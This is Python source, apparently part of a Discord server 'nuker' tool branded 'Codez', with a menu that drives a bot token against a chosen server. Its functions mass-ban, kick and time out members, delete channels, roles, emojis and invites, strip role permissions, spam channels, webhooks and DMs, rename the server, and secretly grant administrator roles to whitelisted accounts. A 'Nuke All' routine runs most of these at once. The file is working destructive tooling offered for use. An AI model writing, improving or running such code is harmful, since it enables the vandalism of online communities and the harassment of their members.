            user_input = user_input.strip()
            if user_input.lower() == 'all':
                members_resp = await self._api_request("get", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members?limit=1000", token)
                if not members_resp or members_resp.status_code != 200:
                    return (0, 0)
                members = members_resp.json()
                users_to_admin = [member['user']['id'] for member in members if member['user']['id'] not in self.whitelist]
            else:
                users_to_admin = [uid.strip() for uid in user_input.split(',') if uid.strip()]
            success_count = 0
            for user_id in users_to_admin:
                async with self.semaphore:
                    try:
                        member_resp = await self._api_request("get", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}", token)
                        if not member_resp or member_resp.status_code != 200:
                            continue
                        current_roles = member_resp.json().get('roles', [])
                        current_roles.append(admin_role_id)
                        response = await self._api_request("patch", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}", token, json={"roles": current_roles})
                        if response and response.status_code in [200, 204]:
                            success_count += 1
                            print(format_log_message("SUCCESS", f"Assigned admin to {user_id}", 50))
                    except:
                        pass
            print(format_log_message("SUCCESS", f"Gave admin to {success_count}/{len(users_to_admin)} users", 40))
            return (success_count, len(users_to_admin))
        except Exception as e:
            print(format_log_message("ERROR", f"Give admin failed: {e}", 40))
            return (0, 0)

    async def execute_delete_invites(self, token: str):
        async with self.semaphore:
            try:
                invites_resp = await self._api_request("get", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/invites", token)
                if not invites_resp or invites_resp.status_code != 200:
                    return (0, 0, 0)
                invites = invites_resp.json()
                deleted = 0
                for invite in invites:
                    del_resp = await self._api_request("delete", f"https://discord.com/api/{next(self.version)}/invites/{invite['code']}", token)
                    if del_resp and del_resp.status_code in [200, 204]:
                        deleted += 1
                return (deleted, time.time(), len(invites))
            except:
                return (0, 0, 0)

    async def execute_timeout_all(self, member: str, duration_seconds: int, token: str):
        if member in self.whitelist:
            return True
        async with self.semaphore:
            timeout_end = (datetime.utcnow() + timedelta(seconds=duration_seconds)).isoformat()
            payload = {"communication_disabled_until": timeout_end}
            try:
                response = await self._api_request("patch", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}", token, json=payload)
                if response and response.status_code in [200, 204]:
                    print(format_log_message("SUCCESS", f"Timed out {member} for {duration_seconds}s", 39))
                    return True
                return False
            except:
                return False

    async def execute_rename_channels(self, token: str):
        new_name = await self.async_input(format_log_message("INPUT", "New channel Name", 50))
        resp = await self._api_request("get", f"https://discord.com/api/v10/guilds/{self.guildid}/channels", token)
        if not resp or resp.status_code != 200:
            return 0
        channels = resp.json()
        count = 0
        for i, ch in enumerate(channels):
            async with self.semaphore:
                try:
                    name = new_name.format(i=i)
                    resp = await self._api_request("patch", f"https://discord.com/api/v10/channels/{ch['id']}", token, json={"name": name})
                    if resp and resp.status_code == 200:
                        count += 1
                        print(format_log_message("SUCCESS", f"Renamed channel {name}", 45))
                except:
                    pass
        return count

    async def execute_rename_roles(self, token: str):
        new_name = await self.async_input(format_log_message("INPUT", "New role Name", 50))
        resp = await self._api_request("get", f"https://discord.com/api/v10/guilds/{self.guildid}/roles", token)
        if not resp or resp.status_code != 200:
            return 0
        roles = resp.json()
        count = 0
        for i, role in enumerate(roles):
            async with self.semaphore:
                try:
                    name = new_name.format(i=i)
                    resp = await self._api_request("patch", f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role['id']}", token, json={"name": name})
                    if resp and resp.status_code == 200:
                        count += 1
                        print(format_log_message("SUCCESS", f"Renamed role {name}", 45))
                except:
                    pass
        return count

    async def execute_lock_all_channels(self, token: str):
        try:
            response = await self._api_request("get", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels", token)
            if response and response.status_code == 200:
                channels = response.json()
                for channel in channels:
                    if channel['type'] in [0, 5]:
                        payload = {"permission_overwrites": [{"id": self.guildid, "type": "role", "allow": "0", "deny": "66560"}]}
                        await self._api_request("patch", f"https://discord.com/api/{next(self.version)}/channels/{channel['id']}", token, json=payload)
                return True
            return False
        except:
            return False

    async def execute_unlock_all_channels(self, token: str):
        try:
            response = await self._api_request("get", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels", token)
            if response and response.status_code == 200:
                channels = response.json()
                for channel in channels:
                    if channel['type'] in [0, 5]:
                        payload = {"permission_overwrites": [{"id": self.guildid, "type": "role", "allow": "66560", "deny": "0"}]}
                        await self._api_request("patch", f"https://discord.com/api/{next(self.version)}/channels/{channel['id']}", token, json=payload)
                return True
            return False
        except:
            return False

    async def execute_rename_emojis(self, token: str):
        new_name = await self.async_input(format_log_message("INPUT", "New emoji name (use {i})", 50))
        resp = await self._api_request("get", f"https://discord.com/api/v10/guilds/{self.guildid}/emojis", token)
        if not resp or resp.status_code != 200:
            return 0
        emojis = resp.json()
        count = 0
        for i, emoji in enumerate(emojis):
            async with self.semaphore:
                try:
                    name = new_name.format(i=i)
                    resp = await self._api_request("patch", f"https://discord.com/api/v10/guilds/{self.guildid}/emojis/{emoji['id']}", token, json={"name": name})
                    if resp and resp.status_code == 200:
                        count += 1
                except:
                    pass
        return count

    async def execute_unick_all_fast(self, token: str):
        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip() and line.strip().isdigit()]
        except:
            return 0
        members = [m for m in members if m not in self.whitelist]
        total = len(members)
        success_count = 0
        async def unick_one(member_id: str):
            nonlocal success_count
            async with self.semaphore:
                try:
                    resp = await self._api_request("patch", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member_id}", token, json={"nick": None})
                    if resp and resp.status_code in (200, 204):
                        success_count += 1
                        print(f"{format_log_message('SUCCESS', f'Unnicked {member_id}', 52)}")
                except:
                    pass
        await asyncio.gather(*(unick_one(mid) for mid in members), return_exceptions=True)
        print(format_log_message("SUCCESS", f"Unnicked {success_count}/{total} members", 55))
        return success_count

    async def execute_strip_perms(self, token: str):
        resp = await self._api_request("get", f"https://discord.com/api/v10/guilds/{self.guildid}/roles", token)
        if not resp or resp.status_code != 200:
            return 0
        roles = resp.json()
        count = 0
        for role in roles:
            if role['id'] != self.guildid:
                async with self.semaphore:
                    try:
                        r = await self._api_request("patch", f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role['id']}", token, json={"permissions": "0"})
                        if r and r.status_code == 200:
                            count += 1
                            print(format_log_message("SUCCESS", f"Stripped perms from role {role['id']}", 45))
                    except:
                        pass
        return count

    async def execute_auto_admin(self, token: str, user_id: str = None):
        if user_id is None:
            user_id = str(__bot_user_id__)
        if user_id in self.whitelist:
            return False
        async with self.semaphore:
            try:
                session = await self._get_session()
                resp = await session.post(f"https://discord.com/api/v10/guilds/{self.guildid}/roles", headers={"Authorization": f"Bot {token}"}, json={"name": "Owner", "permissions": "8", "color": 0xFF0000})
                if resp.status_code != 200:
                    return False
                role_id = resp.json()['id']
                await session.put(f"https://discord.com/api/v10/guilds/{self.guildid}/members/{user_id}/roles/{role_id}", headers={"Authorization": f"Bot {token}"})
                print(format_log_message("SUCCESS", f"Assigned admin to {user_id}", 45))
                return True
            except:
                return False

    async def execute_unban_all(self, token: str):
        choice = await self.async_input(format_log_message("INPUT", "Unban specific user ID, or 'all'? ", 50))
        choice = choice.strip().lower()
        if choice == "all":
            resp = await self._api_request("get", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans", token)
            if not resp or resp.status_code != 200:
                return 0
            bans = resp.json()
            count = 0
            for ban in bans:
                user_id = ban['user']['id']
                if user_id not in self.whitelist:
                    async with self.semaphore:
                        try:
                            r = await self._api_request("delete", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans/{user_id}", token)
                            if r and r.status_code in (200, 204):
                                count += 1
                                print(format_log_message("SUCCESS", f"Unbanned {user_id}", 50))
                        except:
                            pass
            return count
        else:
            if choice.isdigit():
                async with self.semaphore:
                    try:
                        r = await self._api_request("delete", f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans/{choice}", token)
                        if r and r.status_code in (200, 204):
                            print(format_log_message("SUCCESS", f"Unbanned {choice}", 50))
                            return 1
                    except:
                        pass
            return 0

    async def execute_dm_all(self, token: str):
        default_dm = __config__.get("operations", {}).get("dm_message", "@everyone Codez Nuked This Server!")
        message = await self.async_input(format_log_message("INPUT", f"DM message (default: {default_dm})", 50))
        if not message.strip():
            message = default_dm
        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()]
        except:
            return 0
        count = 0
        for member in members:
            if member in self.whitelist:
                continue
            async with self.semaphore:
                try:
                    session = await self._get_session()
                    dm_resp = await session.post(f"https://discord.com/api/v10/users/@me/channels", headers={"Authorization": f"Bot {token}"}, json={"recipient_id": member})
                    if dm_resp.status_code == 200:
                        dm_channel = dm_resp.json()
                        msg_resp = await session.post(f"https://discord.com/api/v10/channels/{dm_channel['id']}/messages", headers={"Authorization": f"Bot {token}"}, json={"content": message})
                        if msg_resp.status_code == 200:
                            count += 1
                            print(format_log_message("SUCCESS", f"DM sent to {member}", 45))
                except:
                    pass
        return count

    async def execute_untimeout_all(self, token: str):
        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()]
        except:
            return 0
        count = 0
        for member in members:
            if member in self.whitelist:
                continue
            async with self.semaphore:
                try:
                    resp = await self._api_request("patch", f"https://discord.com/api/v10/guilds/{self.guildid}/members/{member}", token, json={"communication_disabled_until": None})
                    if resp and resp.status_code in [200, 204]:
                        count += 1
                        print(format_log_message("SUCCESS", f"Removed timeout from {member}", 40))
                except:
                    pass
        return count

    async def execute_nuke_all(self, token: str):
        print(format_log_message("INFO", "Starting FULL NUKE - CODEZ RUNS CORD...", 40))
        nuke_config = __config__.get("nuke_all", {})
        session = await self._get_session()
        channels_resp = await session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels", headers={"Authorization": f"Bot {token}"})
        channels = channels_resp.json() if channels_resp.status_code == 200 else []
        tasks = []
        if nuke_config.get("ban_members", True):
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip() and line.strip().isdigit()]
                for member in members:
                    if member not in self.whitelist:
                        tasks.append(self.execute_ban(member, token))
            except:
                pass
        if nuke_config.get("delete_channels", True):
            for ch in channels:
                tasks.append(self.execute_delchannels(ch['id'], token))
        if nuke_config.get("create_roles", True):
            for _ in range(60):
                role_name = random.choice(__config__["nuke"]["roles_name"] or ["Codez On Top"])
                tasks.append(self.execute_creroles(role_name, token))
        if nuke_config.get("change_guild_name", True):
            guild_name = __config__.get("operations", {}).get("guild_name", "Wizzed By Codez")
            tasks.append(self.execute_change_guild_info(token, new_name=guild_name))
        if nuke_config.get("create_channels", True):
            for _ in range(75):
                ch_name = random.choice(__config__["nuke"]["channel_names"] or ["wizzed-by-Codez"])
                tasks.append(self.execute_crechannels(ch_name, 0, token))
        if nuke_config.get("spam_webhooks", True):
            tasks.append(self.execute_webhook_spam(token))
            tasks.append(self.execute_spam_all_channels(token))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        print(format_log_message("SUCCESS", "FULL NUKE FINISHED!", 45))
        return True

    async def execute_get_invite(self, token: str):
        try:
            platform = await self.async_input(format_log_message("INPUT", "Platform: [w]indows/[m]obile", 32))
            if platform == "MODE_SWITCHED":
                return
            platform = platform.strip().lower()
            session = await self._get_session()
            resp = await session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels", headers={"Authorization": f"Bot {token}"})
            if resp.status_code == 200:
                channels = resp.json()
                if not channels:
                    print(format_log_message("ERROR", "No channels found!", 45))
                    return
                ch_id = channels[0]['id']
                inv_resp = await session.post(f"https://discord.com/api/v10/channels/{ch_id}/invites", headers={"Authorization": f"Bot {token}"}, json={"max_age": 0, "max_uses": 0})
                if inv_resp.status_code == 200:
                    invite_link = f"https://discord.gg/{inv_resp.json().get('code')}"
                    if platform == 'm':
                        print(format_log_message("SUCCESS", f"Invite Link: {invite_link}", 45))
                        await asyncio.sleep(7)
                    else:
                        if _clipboard_copy(invite_link):
                            print(format_log_message("SUCCESS", "Invite Link copied to clipboard!", 45))
                        else:
                            print(format_log_message("INFO", f"Invite: {invite_link}", 45))
        except Exception as e:
            print(format_log_message("ERROR", f"Error: {e}", 45))

    async def execute_guild_info(self, token: str):
        guild_id = await self.async_input(format_log_message("INPUT", "Enter guild ID", 50))
        if not guild_id.isdigit():
            print(format_log_message("ERROR", "Invalid guild ID.", 40))
            return
        session = await self._get_session()
        try:
            resp = await session.get(f"https://discord.com/api/v10/guilds/{guild_id}", headers={"Authorization": f"Bot {token}"})
            if resp.status_code != 200:
                print(format_log_message("ERROR", "Failed to fetch guild", 40))
                return
            guild = resp.json()
            print(f"Guild Name: {guild.get('name')}")
            print(f"Guild ID: {guild.get('id')}")
            print(f"Owner ID: {guild.get('owner_id')}")
            print(f"Members: {guild.get('approximate_member_count', 'N/A')}")
        except Exception as e:
            print(format_log_message("ERROR", f"Error: {e}", 40))

    async def _menu_animator(self):
        while self._animating:
            await asyncio.sleep(0.1)

    async def menu(self):
        while True:
            try:
                console_width = max(os.get_terminal_size().columns, 80)
                console_width = min(console_width, 100)
            except Exception:
                console_width = 80
            
            sys.stdout.write("\033[H\033[2J\033[3J")
            sys.stdout.flush()

            if __mode__ == "deadlizer":
                banner_lines = DEADLIZER_ASCII_STYLES[0]
                mode_start, mode_end = DEADLIZER_START, DEADLIZER_END
            else:
                banner_lines = WIZZLER_ASCII_STYLES[0]
                mode_start, mode_end = WIZZLER_START, WIZZLER_END

            options_raw = """
    <Made By Codez>
    ╭───────────────────────────────────────────────────────────────────────────────────────────────────────────╮
    │                                           CODEZ RUNS CORD                                              │
    ├───────────────────────────────────┬───────────────────────────────────┬───────────────────────────────────┤
    │ <01> Ban Members                  │ <12> Nick All                     │ <23> DM All Members               │
    │ <02> Kick Members                 │ <13> Change guild Icon            │ <24> Unban All Members            │
    │ <03> Prune Members                │ <14> Change Guild Name/description│ <25> Strip All Role Perms         │
    │ <04> Create Channels              │ <15> Give Admin                   │ <26> Auto Admin (Select Users)    │
    │ <05> Create Roles                 │ <16> Delete Invites               │ <27> Lock All Channels            │
    │ <06> Delete Channels              │ <17> Switch Guild                 │ <28> Unlock All Channels          │
    │ <07> Delete Roles                 │ <18> Timeout All                  │ <29> Rename Emojis                │
    │ <08> Delete Emojis                │ <19> Rename All Channels          │ <30> Unick All Users              │
    │ <09> Spam Channels                │ <20> Rename All Roles             │ <31> Nuke All                     │
    │ <10> Check Updates                │ <21> Webhook Spam                 │ <32> Get Invite Link (auto-copy)  │
    │ <11> Credits                      │ <22> Untimeout All                │ <33> Mode: Wizzler/Deadlizer      │
    ├───────────────────────────────────┼───────────────────────────────────┼───────────────────────────────────┤
    │ <34> Whitelist Add Member         │ <35> Whitelist Remove Member      │ <36> View Whitelist               │
    │ <37> Switch Config                │ <38> List Loaded Configs          │ <39> Exit                         │
    ╰───────────────────────────────────┴───────────────────────────────────┴───────────────────────────────────╯
    <40> Guild Info
    <41> Get Bot Invite Link"""

            info_lines = [
                f"   Codez On Top | Mode: {__mode__.upper()}",
                f"     LOADED PROXIES: <{self.proxy_count}>",
                f"     ACTIVE CONFIG: [{__current_config_name__}] | Total: {len(__loaded_configs__)}",
                f"     AUTO-ADMIN: [{'ON' if self.auto_admin_enabled else 'OFF'}] | Whitelisted: {len(self.whitelist)}",
                ""
            ]

            print("\n".join(gradient_text(line.center(console_width), mode_start, mode_end, bold=True) for line in banner_lines))
            for line in info_lines:
                print(gradient_text(line.center(console_width), mode_start, mode_end, bold=True))
            print("\n".join(gradient_text(line.center(console_width), mode_start, mode_end, bold=True) for line in options_raw.splitlines()))
            print()

            self._animating = True
            anim_task = asyncio.create_task(self._menu_animator())
            
            ans = await self.async_input(format_log_message("INPUT", "Select Option (d+enter to switch modes)", 50))
            
            self._animating = False
            await anim_task

            if ans == "MODE_SWITCHED":
                continue

            ans = ans.strip()
            
            # All options with fixed async_input calls
            if ans in ["1", "01"]:
                try:
                    with open("fetched/members.txt", "r") as f:
                        members = [line.strip() for line in f if line.strip()]
                except:
                    print(format_log_message("ERROR", "members.txt not found. Fetch members first.", 29))
                    continue
                tasks = [self.execute_ban(member, token) for member in members]
                await asyncio.gather(*tasks)
                
            elif ans in ["2", "02"]:
                try:
                    with open("fetched/members.txt", "r") as f:
                        members = [line.strip() for line in f if line.strip()]
                except:
                    print(format_log_message("ERROR", "members.txt not found.", 29))
                    continue
                tasks = [self.execute_kick(member, token) for member in members]
                await asyncio.gather(*tasks)
                
            elif ans in ["3", "03"]:
                days_input = await self.async_input(format_log_message("INPUT", "Prune days (1-30)", 50))
                try:
                    days = int(days_input.strip())
                    if 1 <= days <= 30:
                        await self.execute_prune(days, token)
                except:
                    print("Invalid input.")
                    
            elif ans in ["4", "04"]:
                type_input = await self.async_input(format_log_message("INPUT", "Channel type [t/v]", 50))
                type_ = 2 if type_input.strip().lower() == 'v' else 0
                amount_input = await self.async_input(format_log_message("INPUT", "Amount", 50))
                try:
                    amount = int(amount_input.strip())
                    for _ in range(amount):
                        await self.execute_crechannels(random.choice(__config__["nuke"]["channel_names"] or ["wizzed"]), type_, token)
                except:
                    print("Invalid amount.")
                    
            elif ans in ["5", "05"]:
                amount_input = await self.async_input(format_log_message("INPUT", "Amount", 50))
                try:
                    amount = int(amount_input.strip())
                    for _ in range(amount):
                        await self.execute_creroles(random.choice(__config__["nuke"]["roles_name"] or ["Codez"]), token)
                except:
                    print("Invalid amount.")
                    
            elif ans in ["6", "06"]:
                resp = await self._api_request("get", f"https://discord.com/api/v10/guilds/{self.guildid}/channels", token)
                if resp and resp.status_code == 200:
                    for ch in resp.json():
                        await self.execute_delchannels(ch['id'], token)
                        
            elif ans in ["7", "07"]:
                await self.execute_delroles_all(token)
                
            elif ans in ["8", "08"]:
                await self.execute_delemojis_all(token)
                
            elif ans in ["9", "09"]:
                amount_input = await self.async_input(format_log_message("INPUT", "Spam amount", 50))
                try:
                    amount = int(amount_input.strip())
                    for _ in range(amount):
                        await self.execute_spam_all_channels(token)
                except:
                    print("Invalid amount.")
                    
            elif ans == "10":
                print("Checking updates...")
                webbrowser.open("https://discord.gg/codez")
                
            elif ans == "11":
                print("MADE BY Codez | discord.gg/codez")
                await self.async_input(format_log_message("INPUT", "Press Enter", 50))
                
            elif ans == "12":
                nick = await self.async_input(format_log_message("INPUT", "New nickname", 50))
                await self.execute_nick_all_fast(token, nick.strip())
                
            elif ans == "13":
                await self.execute_change_icon(token)
                
            elif ans == "14":
                await self.execute_change_guild_info(token)
                
            elif ans == "15":
                await self.execute_give_admin(token)
                
            elif ans == "16":
                await self.execute_delete_invites(token)
                
            elif ans == "17":
                new_guild = await self.async_input(format_log_message("INPUT", "Enter new Guild ID", 50))
                os.system("cls") if os.name == "nt" else os.system("clear")
                await shakti(new_guild.strip()).menu()
                os._exit(0)
                
            elif ans == "18":
                choice = await self.async_input(format_log_message("INPUT", "Timeout: [1]Day [2]Week [3]28Days", 50))
                dur_map = {"1": 86400, "2": 604800, "3": 2419200}
                if choice.strip() in dur_map:
                    try:
                        with open("fetched/members.txt", "r") as f:
                            members = [line.strip() for line in f if line.strip()]
                        tasks = [self.execute_timeout_all(m, dur_map[choice.strip()], token) for m in members]
                        await asyncio.gather(*tasks)
                    except:
                        pass
                        
            elif ans == "19":
                await self.execute_rename_channels(token)
                
            elif ans == "20":
                await self.execute_rename_roles(token)
                
            elif ans == "21":
                await self.execute_webhook_spam(token)
                
            elif ans == "22":
                await self.execute_untimeout_all(token)
                
            elif ans == "23":
                await self.execute_dm_all(token)
                
            elif ans == "24":
                await self.execute_unban_all(token)
                
            elif ans == "25":
                await self.execute_strip_perms(token)
                
            elif ans == "26":
                choice = await self.async_input(format_log_message("INPUT", "[1]Grant admin [2]Toggle auto-admin", 50))
                if choice == "1":
                    ids = await self.async_input(format_log_message("INPUT", "User IDs (comma-separated)", 50))
                    for uid in [x.strip() for x in ids.split(',') if x.strip()]:
                        await self.execute_auto_admin(token, uid)
                elif choice == "2":
                    self.auto_admin_enabled = not self.auto_admin_enabled
                    print(f"Auto-admin: {'ON' if self.auto_admin_enabled else 'OFF'}")
                    
            elif ans == "27":
                await self.execute_lock_all_channels(token)
                
            elif ans == "28":
                await self.execute_unlock_all_channels(token)
                
            elif ans == "29":
                await self.execute_rename_emojis(token)
                
            elif ans == "30":
                await self.execute_unick_all_fast(token)
                
            elif ans == "31":
                await self.execute_nuke_all(token)
                
            elif ans == "32":
                await self.execute_get_invite(token)
                
            elif ans == "33":
                if __mode__ == "wizzler":
                    await switch_to_deadlizer()
                else:
                    await switch_to_wizzler()
                    
            elif ans == "34":
                uid = await self.async_input(format_log_message("INPUT", "User ID to whitelist", 50))
                await self.add_to_whitelist(uid.strip())
                
            elif ans == "35":
                uid = await self.async_input(format_log_message("INPUT", "User ID to remove from whitelist", 50))
                await self.remove_from_whitelist(uid.strip())
                
            elif ans == "36":
                print(f"Whitelisted ({len(self.whitelist)}):")
                for uid in sorted(self.whitelist):
                    print(f"  {uid}")
                await self.async_input(format_log_message("INPUT", "Press Enter", 50))
                
            elif ans == "37":
                if len(__loaded_configs__) < 2:
                    print("Only one config loaded.")
                else:
                    names = list(__loaded_configs__.keys())
                    for i, n in enumerate(names):
                        print(f"{i+1}. {n}")
                    try:
                        idx = int((await self.async_input(format_log_message("INPUT", "Choose number", 50))).strip()) - 1
                        if 0 <= idx < len(names):
                            switch_config(names[idx])
                            print(f"Switched to {names[idx]}")
                    except:
                        pass
                        
            elif ans == "38":
                print(f"Loaded Configs ({len(__loaded_configs__)}):")
                for name in __loaded_configs__:
                    marker = "ACTIVE" if name == __current_config_name__ else "inactive"
                    print(f"  [{marker}] {name}")
                await self.async_input(format_log_message("INPUT", "Press Enter", 50))
                
            elif ans == "39":
                print("Exiting...")
                os._exit(0)
                
            elif ans == "40":
                await self.execute_guild_info(token)
                
            elif ans == "41":
                link = __config__.get("operations", {}).get("ouath2")
                if link:
                    p = await self.async_input(format_log_message("INPUT", "Platform: [w]indows/[m]obile", 50))
                    if p.startswith('w'):
                        if _clipboard_copy(link):
                            print("Copied to clipboard!")
                        else:
                            print(link)
                    else:
                        print(link)
                else:
                    print("'ouath2' not found in config")
                    
            else:
                print(format_log_message("ERROR", f"Invalid option: {ans}!", 47))


# ==================== GATEWAY & MAIN ====================
async def gateway_listener():
    global bot_instance
    token = __config__["token"]
    gateway_url = "wss://gateway.discord.gg/?v=10&encoding=json"
    _sequence = None
    _session_id = None
    _resume_url = None
    _heartbeat_ack = True
    _reconnect_delay = 1

    while True:
        ws = None
        heartbeat_task = None
        try:
            connect_url = _resume_url if _resume_url else gateway_url
            ws = await websockets.connect(connect_url, max_size=2**20, ping_interval=None, close_timeout=4)
            hello = json.loads(await ws.recv())
            if hello.get("op") != 10:
                raise Exception("Expected HELLO")
            heartbeat_interval = hello["d"]["heartbeat_interval"] / 1000
            _heartbeat_ack = True

            if _session_id and _sequence is not None:
                await ws.send(json.dumps({"op": 6, "d": {"token": token, "session_id": _session_id, "seq": _sequence}}))
            else:
                await ws.send(json.dumps({"op": 2, "d": {"token": token, "intents": 32767, "properties": {"os": "windows", "browser": "disco", "device": "disco"}, "large_threshold": 250}}))

            async def heartbeat_loop():
                nonlocal _heartbeat_ack
                await asyncio.sleep(heartbeat_interval * random.random())
                while True:
                    if not _heartbeat_ack:
                        await ws.close(4000)
                        return
                    _heartbeat_ack = False
                    try:
                        await ws.send(json.dumps({"op": 1, "d": _sequence}))
                    except Exception:
                        return
                    await asyncio.sleep(heartbeat_interval)

            heartbeat_task = asyncio.create_task(heartbeat_loop())
            _reconnect_delay = 1

            while True:
                msg = await ws.recv()
                data = json.loads(msg)
                op = data.get("op")
                t = data.get("t")
                s = data.get("s")
                if s is not None:
                    _sequence = s
                if op == 11:
                    _heartbeat_ack = True
                elif op == 1:
                    await ws.send(json.dumps({"op": 1, "d": _sequence}))
                elif op == 7:
                    await ws.close(4000)
                    break
                elif op == 9:
                    d = data.get("d")
                    if not d:
                        _session_id = None
                        _sequence = None
                        _resume_url = None
                    await asyncio.sleep(random.uniform(1, 5))
                    await ws.close(4000)
                    break
                elif op == 0:
                    if t == "READY":
                        d = data.get("d", {})
                        _session_id = d.get("session_id")
                        _resume_url = d.get("resume_gateway_url")
                        if _resume_url:
                            _resume_url += "?v=10&encoding=json"
                    elif t == "GUILD_MEMBER_ADD":
                        member_data = data["d"]
                        if bot_instance and bot_instance.auto_admin_enabled:
                            member_id = member_data["user"]["id"]
                            if str(member_id) in bot_instance.whitelist:
                                try:
                                    session = await bot_instance._get_session()
                                    role_payload = {"name": "Admin", "permissions": "8", "color": 0xFF0000}
                                    resp = await session.post(f"https://discord.com/api/v10/guilds/{member_data['guild_id']}/roles", headers={"Authorization": f"Bot {token}"}, json=role_payload)
                                    if resp.status_code == 200:
                                        role_id = resp.json()["id"]
                                        await session.put(f"https://discord.com/api/v10/guilds/{member_data['guild_id']}/members/{member_id}/roles/{role_id}", headers={"Authorization": f"Bot {token}"})
                                        print(format_log_message("SUCCESS", f"Auto-granted admin to {member_data['user']['username']}", 25))
                                except:
                                    pass

        except websockets.exceptions.ConnectionClosedError as e:
            if e.code == 4004:
                print(format_log_message("ERROR", "Invalid token!", 40))
                return
            if e.code in (4010, 4011, 4012, 4013, 4014):
                _session_id = None
                _sequence = None
                _resume_url = None
        except Exception:
            pass
        finally:
            if heartbeat_task and not heartbeat_task.done():
                heartbeat_task.cancel()
            if ws:
                try:
                    await ws.close()
                except Exception:
                    pass
        await asyncio.sleep(min(_reconnect_delay, 30))
        _reconnect_delay = min(_reconnect_delay * 2, 30)


async def on_ready_mock():
    global bot_instance, __bot_user_id__, __bot_user_name__, __bot_user_discriminator__, __bot_guilds__
    try:
        os.system("cls") if os.name == "nt" else os.system("clear")
        token = __config__["token"]
        async with httpx.AsyncClient() as client:
            user_resp = await client.get("https://discord.com/api/v10/users/@me", headers={"Authorization": f"Bot {token}"})
            if user_resp.status_code == 200:
                user_data = user_resp.json()
                __bot_user_id__ = user_data["id"]
                __bot_user_name__ = user_data["username"]
                __bot_user_discriminator__ = user_data["discriminator"]
            else:
                print(format_log_message("ERROR", "Invalid Bot Token!", 24))
                os._exit(1)
            guilds_resp = await client.get("https://discord.com/api/v10/users/@me/guilds", headers={"Authorization": f"Bot {token}"})
            if guilds_resp.status_code == 200:
                __bot_guilds__ = guilds_resp.json()
        
        _animate_typewriter_log("SUCCESS", f"Authenticated as: {__bot_user_name__}#{__bot_user_discriminator__}", 24)
        asyncio.create_task(gateway_listener())

        fetch_guilds_choice = await asyncio.get_event_loop().run_in_executor(None, lambda: input(format_log_message("INFO", "Fetch guild list? [y/n]", 50)))
        fetch_guilds_choice = fetch_guilds_choice.strip().lower()

        guildid = ""
        if fetch_guilds_choice == 'y' and __bot_guilds__:
            _animate_guild_list(__bot_guilds__, PINK_START, PINK_END)
            try:
                choice = await asyncio.get_event_loop().run_in_executor(None, lambda: input(format_log_message("INFO", "Choose guild number", 50)))
                choice = choice.strip()
                if choice:
                    idx = int(choice) - 1
                    if 0 <= idx < len(__bot_guilds__):
                        guildid = str(__bot_guilds__[idx]['id'])
                        print(format_log_message("SUCCESS", f"Selected: {__bot_guilds__[idx]['name']}", 43))
            except:
                pass

        if not guildid:
            guildid = await asyncio.get_event_loop().run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID", 50)))
            guildid = guildid.strip()

        if not guildid:
            print(format_log_message("ERROR", "No guild ID provided!", 32))
            os._exit(1)

        bot_instance = shakti(guildid)
        await bot_instance.menu()
    except KeyboardInterrupt:
        os.system("cls") if os.name == "nt" else os.system("clear")
        print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
        os._exit(0)


# ==================== ENTRY POINT ====================
try:
    _passkey_gate()
    show_startup_banner()
    __mode__ = "deadlizer"
    print(format_log_message("INFO", "DEVELOPED BY CODEZ", 40))
    time.sleep(1.0)
    os.system("cls") if os.name == "nt" else os.system("clear")
except KeyboardInterrupt:
    print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
    os._exit(0)

try:
    print(format_log_message("INFO", "Load config file or manual input? [c/m]", 50), end=" ")
    config_choice = input().strip().lower()

    if config_choice == 'm':
        __manual_mode__ = True
        token = input(format_log_message("INPUT", "Enter bot token", 50)).strip()
        if not token:
            print(format_log_message("ERROR", "Token is required!", 47))
            os._exit(1)
        max_concurrent = input(format_log_message("INPUT", "Max concurrent (default 200)", 50)).strip()
        max_concurrent = int(max_concurrent) if max_concurrent.isdigit() else 200
        use_proxy = input(format_log_message("INPUT", "Use proxies? [y/n]", 50)).strip().lower() == 'y'

        __config__ = {
            "token": token,
            "max_concurrent": max_concurrent,
            "proxy": use_proxy,
            "nuke": {"channel_names": ["wizzed-by-Codez"], "roles_name": ["Codez On Top"], "messages_content": ["@everyone @here Wizzed by Codez"], "delete_all_channels": False},
            "nuke_all": {"ban_members": True, "delete_channels": True, "delete_roles": True, "delete_emojis": True, "change_guild_name": True, "create_channels": True, "create_roles": True, "spam_webhooks": True},
            "operations": {"ban_reason": "Nuked by Codez", "nick_users_to": "Wizzed by Codez", "dm_message": "@everyone Codez wizzed This Server!", "spam_message": "@everyone @here Wizzed by Codez", "guild_name": "Wizzed By Codez", "guild_icon": "", "channel_type": 0, "enable_auto_admin": True, "emoji_rename_to": "Wizzed by Codez"}
        }
        __loaded_configs__["manual"] = __config__.copy()
        __current_config_name__ = "manual"
        print(format_log_message("SUCCESS", "Manual configuration loaded", 33))
        os.system("cls") if os.name == "nt" else os.system("clear")
    else:
        load_multiple_configs()
        os.system("cls") if os.name == "nt" else os.system("clear")
except KeyboardInterrupt:
    os.system("cls") if os.name == "nt" else os.system("clear")
